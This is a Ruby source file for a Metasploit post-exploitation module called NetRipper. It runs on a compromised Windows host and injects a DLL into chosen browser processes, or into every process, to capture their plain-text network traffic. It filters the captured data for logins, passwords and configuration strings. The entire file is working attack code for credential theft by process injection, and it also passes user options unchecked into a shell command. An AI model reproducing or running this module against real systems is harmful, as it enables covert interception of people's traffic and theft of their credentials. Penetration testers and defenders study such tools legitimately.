##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/reflective_dll_injection'
require 'rex'

class Metasploit3 < Msf::Post
  
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Gather NetRipper Capture Network Traffic',
      'Description'   => %q{
        This module allows capturing plain-text network traffic
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Ionut Popescu <ionut.popescu[at]outlook.com>' ],
      'Platform'      => [ 'win' ],
      'Arch'          => [ 'x86' ],
      'SessionTypes'  => [ 'meterpreter' ],
    ))

    register_options(
    [
      OptString.new('PROCESSNAMES', [ false, 'Process names. E.g. firefox.exe,chrome.exe' ]),
      OptString.new('PROCESSIDS',   [ false, 'Process IDs. E.g. 1244,1256' ]),
      OptString.new('DATAPATH',     [ false, 'Where to save files. E.g. C:\\Windows\\Temp or TEMP', 'TEMP' ]),
      OptString.new('PLAINTEXT',    [ false, 'True to save only plain-text data',                   'true' ]),
      OptString.new('DATALIMIT',    [ false, 'The number of bytes to save from requests/responses', '4096' ]),
      OptString.new('STRINGFINDER', [ false, 'Search for specific strings in captured data',        'user,login,pass,database,config' ])
    ], self.class)
  end

  # Main method

  def run
    processnames	 = datastore['PROCESSNAMES']
    processids		 = datastore['PROCESSIDS']
    datapath		 = datastore['DATAPATH']
    plaintext		 = datastore['PLAINTEXT']
    datalimit		 = datastore['DATALIMIT']
    stringfinder	 = datastore['STRINGFINDER']
    
    dllpath = '/usr/share/metasploit-framework/modules/post/windows/gather/netripper/NewDLL.dll'
    
    # Generate DLL
    
    command_line = "/usr/share/metasploit-framework/modules/post/windows/gather/netripper/netripper -w /usr/share/metasploit-framework/modules/post/windows/gather/netripper/DLL.dll -l #{datapath} -p #{plaintext} -d #{datalimit} -s #{stringfinder}"
    
    executed = system(command_line)
    
    # ALL

    if processnames == 'ALL'
	print_status("Injecting in all processes...")
	
	session.sys.process.get_processes().each do |x|
	  
	  # Inject in all processes
	  
	  print_status("Trying to inject in #{x['name']} - #{x['pid']}")
	  
	  begin

	  host_process = client.sys.process.open(x['pid'], PROCESS_ALL_ACCESS)
	  dll_mem, offset = inject_dll_into_process(host_process, dllpath)
	  host_process.thread.create(dll_mem + offset, 0)
	  
	  # On error
	  
	  rescue Rex::Post::Meterpreter::RequestError

	    print_status("Cannot inject in #{x['name']} - #{x['pid']}")
	      
	  end
	  
	end
	
    else
      
	# Inject in specific processes
      
	print_status("Injecting in #{processnames} ...")
	
	processes = processnames.split(',')
	
	session.sys.process.get_processes().each do |x|

	  processes.each do |process_name|
	    
	    if process_name.downcase == x['name'].downcase
	      
	      print_status("Trying to inject in #{x['name']} - #{x['pid']}")
	      
	      begin

	      host_process = client.sys.process.open(x['pid'], PROCESS_ALL_ACCESS)
	      dll_mem, offset = inject_dll_into_process(host_process, dllpath)
	      host_process.thread.create(dll_mem + offset, 0)
	   
	      # On error
	   
	      rescue Rex::Post::Meterpreter::RequestError

		print_status("Cannot inject in #{x['name']} - #{x['pid']}")
	      
	      end
	      
	    end
	    
	  end
	
	end
    end
    

  end

end
